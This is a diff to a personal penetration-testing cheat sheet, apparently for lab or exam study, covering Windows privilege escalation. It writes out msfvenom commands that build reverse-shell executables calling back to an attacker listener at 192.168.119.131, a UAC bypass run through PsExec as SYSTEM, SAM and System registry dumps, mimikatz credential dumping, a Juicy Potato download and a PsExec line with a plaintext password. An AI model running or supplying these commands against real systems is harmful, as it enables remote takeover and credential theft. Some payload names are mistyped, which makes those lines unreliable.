@@ -258,25 +258,34 @@ Pattern
         4.2 Windows           
         ref  : https://samsclass.info/123/proj10/px16-hashcat-win.htm
                https://guif.re/windowseop
+               https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+               
         
         4.2.1 UAC Bypass   ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
              whoami /priv
              Look for SeChangeNotifyPrivilege'       Bypass traverse checking             Enabled 
-             Download: https://github.com/turbo/zero2hero
-             Create two reverse shell
-               msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
-               msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe
-               
-               msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
-               msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe
+             Download: https://github.com/turbo/zero2hero  --> main.c
+             Create two reverse shells
+                     msfvenom -a x86 --platform Windows -p windows/shell_everse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
+                     msfvenom -a x86 --platform Windows -p windows/shell_everse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe
+
+                     msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
+                     msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe
+             Update the main.c file then compile 
+                      x86_64-w64-mingw32-gcc shell.c -o shell.exe  --> compile to x64
+                      i686-w64-mingw32-gcc shell.c -o shell.exe  --> compile to x86
+             Download PsExec
+                      https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+                      PsExec64.exe -i -accepteula -d -s reverse_3333.exe
+             
         4.2.2 Passing cred
             '/Psexec.exe /accepteula -user alice -p aliceishere -c ./8000.exe'                       
                     
         4.2.3 Saving Creds         
             4.2.3.1 Manual
                 Windows Hash: Security Accounts Manager
-                    'reg save HKLM\SAM c:\SAM'
-                    'reg save HKLM\System c:\System'
+                    reg save HKLM\SAM c:\SAM
+                    reg save HKLM\System c:\System
                         --> Then smbserver to save back to kali. 
                     'samdump2 System SAM'
             4.2.3.2 Auto
@@ -285,6 +294,8 @@ Pattern
                     privilege::debug
                     token::elevate
                     lsadump::sam
+                Juicy Potato
+                     https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
                     
                     
     4.3.Priviliege Escalation      
@@ -324,10 +335,6 @@ Windows x86 Machine powershell location
     C:\Windows\System32\WindowsPowerShell\v1.0
     C:\Windows\SysWOW64\WindowsPowerShell\v1.0
 Windows x64 Machine Powershell location
-
-Compiling C in Kali
-    x86_64-w64-mingw32-gcc shell.c -o shell.exe  --> compile to x86
-    i686-w64-mingw32-gcc shell.c -o shell.exe  --> compile to x64
 
 Powershell command
     Download file 
